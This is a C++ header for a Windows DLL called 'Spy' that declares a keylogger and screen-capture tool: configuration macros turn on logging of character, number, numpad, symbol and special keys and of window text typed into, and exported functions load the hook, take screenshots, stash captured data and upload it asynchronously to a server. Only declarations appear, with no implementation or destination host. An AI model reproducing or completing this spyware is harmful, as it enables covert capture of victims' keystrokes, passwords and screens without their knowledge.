#pragma once

#include <windows.h>
#include "../../log-cpp/log.h"

#ifdef WIN32
#define SPY_FILE_SEPARATOR				'\\'
#else
#define SPY_FILE_SEPARATOR				'/'
#endif

#define SPY_AUTO_FFLUSH							/* auto flush data back to hook file when write */
#define SPY_LOG_WINTEXT							/* enable log window text which typed on it */
#define SPY_LOG_NUMBER							/* enable log number keys */
#define SPY_LOG_NUMPAD							/* enable log numpad keys */
#define SPY_LOG_CHARACTER						/* enable log character keys */
#define SPY_LOG_SPECIAL							/* enable log special keys */
#define SPY_LOG_SYMBOL							/* enable log symbol keys */
#define SPY_LOG_UNKNOWN							/* enable log unknown keys */
#define SPY_MAX_WTEXT_LTH				MAX_PATH
#define SPY_TMP_FNAME_LTH				32
#define SPY_TMP_DIR						"C:\\Users\\xuans\\Desktop\\spy"
#define SPY_TMP_FNAME_STASH				"stash"
#define SPY_TMP_KBH_MSZ					1024

#define EXPORT __declspec(dllexport)
#define ADD_FLAG(state, flag) {state |= flag;}
#define REM_FLAG(state, flag) {state &= ~flag;}
#define HAS_FLAG(state, flag) ((state & flag) == flag)
#define SAFE_FREE(ptr) {if (ptr != NULL) {delete ptr; ptr = NULL;}}

#define strdup _strdup							/* just using _strdup instead of strdup, ignore warning :| I don't know why this warning is happening */

// take a screenshot and push to stash for pending send to server
EXPORT VOID take_scrot();
EXPORT DWORD load_spy();
EXPORT VOID unload_spy();

class Stash;

class Spy
{
	static Stash * stash;
	static void get_temp_fname(char * buffer, int l);
	static void path_combine(char * dst, const char * dir, const char * fname);
	static Stash * gen_stash();
public:
	static DWORD load(HINSTANCE hinstance);
	static void unload();
	static void get_temp_fpath(char * buffer, const char * fname = NULL);
	static Stash * get_stash();
	static void take_screenshot();
	static void upload_async();
};